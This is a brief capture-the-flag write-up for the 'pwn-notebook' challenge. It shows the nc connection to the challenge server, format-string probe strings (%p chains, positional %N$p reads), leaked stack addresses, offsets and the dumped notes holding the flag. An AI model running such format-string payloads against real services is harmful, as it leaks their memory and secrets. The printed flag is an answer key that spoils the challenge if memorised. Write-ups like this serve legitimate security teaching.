## Brief

Wow, it’s a crowded day at Heathrow, lots of suits that bump into each other and try to catch their plane. You have to find the gate to the secret warehouse, it cannot be far away. You see a suspicious suit go into a fast food court and you spot him disappear behind the checkout. Hmmm, odd?! You follow, and when no one sees you follow him. You go through a desolated kitchen, it stinks, you cover your nose with the back of your hand. You pass through a small entrance, and enter the secret warehouse, wow, it’s vast!

Challenge: pwn-notebook (pwn)
Please help me restore my deleted note.

## Link 

https://capturetheflag.withgoogle.com/pwn-notebook.2021.ctfcompetition.com

## Solve

An elf file with all the protections in the world

accessing the server with nc, we get some notes and a DELETED at position 4

`nc pwn-notebook.2021.ctfcompetition.com 1337`

We have a format string vulnerability here

%s doesnt work but %d and %p do

we can try to enumerate the stack with it (on local)

Pwntools is my friend.

%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x

%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p

0x55555555700e.0x2c.0xffffffffffffffd2.0x4.0x7fffffffc3f0.0x28f7dce7e3.0x55555555700e.0x7fffffffc470.0x555555557011.0xa.0x28.0x2e70252e7025202f.0x70252e70252e7025.% \
\ p.0x55555555701a.0x2c.0xffffffffffffffd2.0x4.0x7fffffffc3f0.0x28f7dce7e3

stack at 0x7fffffffc8c0

first var at 0x7fffffffc8f0
secnd var at 0x7fffffffcaec
third var at 0x7fffffffccf8

0x30 from start of stack
48
0x1fc between the 2
508

between 1 and 2:
0x20c (524)

b snprintf in draft\_note : b \*0x0000555555555c12
first line at 0x7fffffffc8f0 (0x204 between)
second line at 0x7fffffffcaf4 (0x203 between)
third line at 0x7fffffffccf8

We write a script to dump the stack contents

```
./solve.py
strings result

< %11$p.%12$p.%13$p.%14$p.%15$p >
%26$p.%27$p.%28$p.%29$p.%35$p
U%511s%96$p.%9102$p.%103$p.%104$p.%105$p
Shipping manifest #1337: Thingomabobs
PSA: The forklift is under maintenance
Note to staff: Please clean up the mess in warehouse 42
Reminder: CTF{format_string_for_the_win}@
^[;&aY
Urgent: The delivery at 15:10 is prioritised@@@
```

Flag is `CTF{format_string_for_the_win}`
